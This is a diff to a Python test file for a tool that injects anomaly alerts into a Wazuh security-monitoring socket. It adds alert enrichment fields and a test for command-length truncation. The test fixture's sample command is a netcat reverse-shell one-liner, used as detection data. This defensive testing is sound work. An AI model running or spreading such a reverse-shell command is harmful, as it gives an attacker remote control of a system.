@@ -15,7 +15,19 @@ def test_send_alert_delivers_formatted_payload(tmp_path: Path) -> None:
     server.bind(socket_path)
     try:
         injector = WazuhSocketInjector(socket_path)
-        assert injector.send_alert("001", 100100, 0.873, "suspicious_proc") is True
+        assert (
+            injector.send_alert(
+                "001",
+                100100,
+                0.873,
+                "suspicious_proc",
+                command="nc -e /bin/sh 10.0.0.0 4444",
+                user="root",
+                timestamp="2026-06-06T12:00:00+0000",
+                agent_name="db-prod",
+            )
+            is True
+        )
 
         raw = server.recv(65536).decode("utf-8")
         assert raw.startswith(QUEUE_PREFIX)
@@ -26,6 +38,26 @@ def test_send_alert_delivers_formatted_payload(tmp_path: Path) -> None:
         assert alert["rule_id"] == 100100
         assert alert["process_name"] == "suspicious_proc"
         assert alert["anomaly_score"] == 0.873
+        # Enrichment fields the triage layer relies on.
+        assert alert["command"] == "nc -e /bin/sh 10.0.0.0 4444"
+        assert alert["user"] == "root"
+        assert alert["agent_name"] == "db-prod"
+        assert alert["event_timestamp"] == "2026-06-06T12:00:00+0000"
+    finally:
+        server.close()
+
+
+def test_send_alert_truncates_oversized_command(tmp_path: Path) -> None:
+    from src.injector import MAX_COMMAND_LEN
+
+    socket_path = str(tmp_path / "queue")
+    server = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
+    server.bind(socket_path)
+    try:
+        injector = WazuhSocketInjector(socket_path)
+        injector.send_alert("001", 100100, 0.5, "proc", command="A" * 5000)
+        body = json.loads(server.recv(65536).decode("utf-8")[len(QUEUE_PREFIX):])
+        assert len(body["anomaly_detector"]["command"]) == MAX_COMMAND_LEN
     finally:
         server.close()
 
